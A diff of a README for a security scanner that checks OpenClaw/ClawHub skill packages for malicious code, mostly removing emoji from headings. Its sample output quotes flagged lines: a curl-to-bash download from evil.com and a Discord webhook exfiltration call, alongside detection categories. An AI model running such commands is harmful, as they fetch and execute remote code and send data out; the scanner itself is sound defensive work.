@@ -1,4 +1,4 @@
-# 🛡️ ClawHub Skill Scanner
+#  ClawHub Skill Scanner
 
 Security scanner for [OpenClaw](https://openclaw.ai) and [ClawHub](https://clawhub.com) skill installations.
 
@@ -6,7 +6,7 @@ Security scanner for [OpenClaw](https://openclaw.ai) and [ClawHub](https://clawh
 
 Developed in response to the [ClawHavoc campaign](https://www.esecurityplanet.com/threats/hundreds-of-malicious-skills-found-in-openclaws-clawhub/) (Feb 2026) that compromised 341 malicious skills on ClawHub.
 
-## 🚀 Quick Start
+##  Quick Start
 
 ```bash
 # Install via ClawHub
@@ -16,7 +16,7 @@ clawhub install clawhub-skill-scanner
 git clone https://github.com/amir-ag/clawhub-skill-scanner.git
 ```
 
-## 📖 Usage
+##  Usage
 
 ```bash
 # Scan a skill folder
@@ -29,9 +29,9 @@ python3 scripts/scan_skill.py /path/to/skill --json
 python3 scripts/scan_skill.py /path/to/skill --install-if-safe
 ```
 
-## 🔍 What It Detects
+##  What It Detects
 
-### 🔴 CRITICAL (Blocks Installation)
+###  CRITICAL (Blocks Installation)
 
 | Category | Examples |
 |----------|----------|
@@ -44,7 +44,7 @@ python3 scripts/scan_skill.py /path/to/skill --install-if-safe
 | **Command Injection** | eval(), exec(), subprocess shell=True |
 | **Obfuscation** | base64 decode pipes, pickle, marshal |
 
-### 🟡 WARNING (Review Required)
+###  WARNING (Review Required)
 
 Only patterns that are suspicious regardless of skill type:
 - Raw socket usage
@@ -52,39 +52,39 @@ Only patterns that are suspicious regardless of skill type:
 - File/directory deletion
 - Screenshot/keyboard capture libraries
 
-## 📊 Risk Scoring
+##  Risk Scoring
 
 | Score | Level | Action |
 |-------|-------|--------|
-| 0-20 | 🟢 SAFE | Auto-approve |
-| 21-50 | 🟡 CAUTION | Review findings |
-| 51-80 | 🔶 DANGER | Detailed review required |
-| 81-100 | 🔴 BLOCKED | Do NOT install |
+| 0-20 |  SAFE | Auto-approve |
+| 21-50 |  CAUTION | Review findings |
+| 51-80 |  DANGER | Detailed review required |
+| 81-100 |  BLOCKED | Do NOT install |
 
-## 📋 Sample Output
+##  Sample Output
 
 ```
 ════════════════════════════════════════════════════════════
   SKILL SECURITY AUDIT: suspicious-skill
 ════════════════════════════════════════════════════════════
 
-📊 RISK SCORE: 90/100 - 🔴 BLOCKED
+ RISK SCORE: 90/100 -  BLOCKED
 
-🔴 CRITICAL FINDINGS (3)
+ CRITICAL FINDINGS (3)
   [install.py:15] Curl pipe to shell (DANGEROUS!)
     Code: os.system('curl https://evil.com/x.sh | bash')
   [setup.py:42] Discord webhook exfiltration
     Code: requests.post('https://discord.com/api/webhooks/...')
 
-📁 FILES SCANNED: 5
-📏 TOTAL LINES: 230
+ FILES SCANNED: 5
+ TOTAL LINES: 230
 
 ════════════════════════════════════════════════════════════
-  🔴 BLOCK - Do NOT install this skill
+   BLOCK - Do NOT install this skill
 ════════════════════════════════════════════════════════════
 ```
 
-## 🔧 Integration
+##  Integration
 
 ### Pre-Install Hook
 
@@ -112,16 +112,16 @@ rm -rf "$TEMP"
     fi
 ```
 
-## 🤝 Contributing
+##  Contributing
 
 Found a malicious pattern we don't detect? Open an issue or PR!
 
 See `references/threat-patterns.md` for the full pattern documentation.
 
-## 📜 License
+##  License
 
 MIT License - Use freely, stay safe.
 
 ---
 
-*Stay vigilant. Scan before you install.* 🛡️
+*Stay vigilant. Scan before you install.* 
